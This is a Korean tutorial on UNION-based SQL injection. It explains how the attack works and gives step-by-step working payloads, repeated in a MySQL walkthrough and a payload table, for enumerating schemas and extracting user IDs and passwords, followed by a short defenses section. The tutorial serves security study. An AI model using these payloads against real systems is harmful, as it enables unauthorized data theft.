
## 유니온 기반 SQL 인젝션 (UNION-based SQL Injection)

`UNION-based SQL Injection`은 **SQL의 `UNION` 연산자를 악용하여 원래 쿼리 결과 뒤에 공격자가 만든 쿼리 결과를 덧붙이는 방식**의 공격이다. 결과가 HTTP 응답에 출력될 때, 공격자가 원하는 데이터베이스 내부 정보를 직접 확인할 수 있어 강력한 정보 수집 도구로 쓰인다.

---

## 특징

- SQL의 `UNION` 또는 `UNION ALL` 연산자 사용
- 쿼리 결과가 직접 HTML/응답에 노출되어야 유효
- **에러 기반보다 더 많은 데이터**를 한 번에 추출 가능
- 응답 차이가 명확해 **Blind 방식보다 빠름**

---

## 공격 조건

`UNION` 연산자는 다음 조건이 만족되어야 정상 작동한다:

1. **컬럼 수 일치**: 원래 쿼리와 공격자가 삽입한 쿼리의 SELECT 컬럼 수가 같아야 함  
2. **컬럼 타입 호환**: 각 컬럼의 데이터 타입이 원래 쿼리와 일치하거나 호환되어야 함

---

## 공격 절차

1. **취약점 존재 여부 확인**
   ```sql
   ' OR 1=1 --
   ' AND 1=2 --
   ```
   - 응답 차이가 있을 경우 인젝션 가능성 있음

2. **컬럼 개수 파악**
   ```sql
   ' ORDER BY 1 --
   ' ORDER BY 2 --
   ...
   ' ORDER BY N --
   ```
   - 오류 발생 직전 숫자가 컬럼 수  
   또는
   ```sql
   ' UNION SELECT NULL --
   ' UNION SELECT NULL, NULL --
   ...
   ```

3. **출력 컬럼 탐색**
   ```sql
   ' UNION SELECT 1,2,3 --
   ```
   - 숫자 대신 `'A'`, `'B'` 등을 넣어 문자열 출력 가능 컬럼 확인

4. **데이터베이스 구조 및 정보 추출**
   ```sql
   ' UNION SELECT database(), user(), version() --
   ' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
   ' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
   ' UNION SELECT id, password FROM users --
   ```

---

## DBMS 별 주요 기법

| DBMS       | 대표 함수 / 기법 예시 |
|------------|------------------------|
| **MySQL**  | `UNION SELECT`, `information_schema`, `group_concat()` 등 |
| **MSSQL**  | `UNION SELECT`, `sysobjects`, `syscolumns` 등 |
| **Oracle** | `UNION SELECT`, `all_tables`, `all_tab_columns`, `dual` 테이블 |
| **PostgreSQL** | `UNION SELECT`, `pg_catalog.pg_tables`, `pg_user`, `version()` 등 |

---

## MySQL 예시

### 1. 컬럼 수 파악
```sql
' ORDER BY 3 --
```

### 2. 출력 위치 확인
```sql
' UNION SELECT 1,2,3 --
```

### 3. DB 및 사용자 정보
```sql
' UNION SELECT database(), user(), version() --
```

### 4. 테이블 및 컬럼 탐색
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

### 5. 실제 데이터 추출
```sql
' UNION SELECT id, password FROM users --
```

---

## 페이로드 예시

| 목적 | 페이로드 예시 |
|------|----------------|
| DB 이름, 사용자 추출 | `' UNION SELECT database(), user(), version() --` |
| 테이블 목록 확인 | `' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --` |
| 컬럼 목록 확인 | `' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --` |
| 사용자 데이터 추출 | `' UNION SELECT id, password FROM users --` |

---

## 대응 방안

- **입력값 필터링**: `'`, `--`, `union`, `select`, `information_schema` 등 SQL 관련 키워드 필터링  
- **Prepared Statement 사용**: SQL 명령어와 데이터를 명확히 분리
- **출력 제한**: 사용자 입력이 포함된 SQL 결과를 직접 출력하지 않도록 설계
- **WAF 도입**: SQL Injection 시도 탐지 및 차단
- **정기적 점검**: 자동화 도구를 통한 정기 스캔 및 코드 리뷰

---

## 정리

> UNION 기반 SQL Injection은 **쿼리 결과에 공격자의 쿼리 결과를 합쳐 출력하는 방식**으로, 시스템이 응답에 SQL 결과를 포함하는 구조일 때 강력한 정보 추출 수단이다.

> 빠른 정보 노출이 가능하지만, 쿼리 구조를 정확히 파악하고 컬럼 수와 타입을 맞춰야 성공 가능성이 높아진다.

> 대응을 위해선 **출력 제한**, **쿼리 구조 보호**, **정형 입력만 허용하는 설계**가 필수적이다.

## 참고 사이트
[NetSPI](https://sqlwiki.netspi.com/injectionTypes/unionBased/#mysql "UNION 기반 SQL 인젝션")

[Oracle](https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet "Oracle SQL Injection Cheat Sheet")


<hr />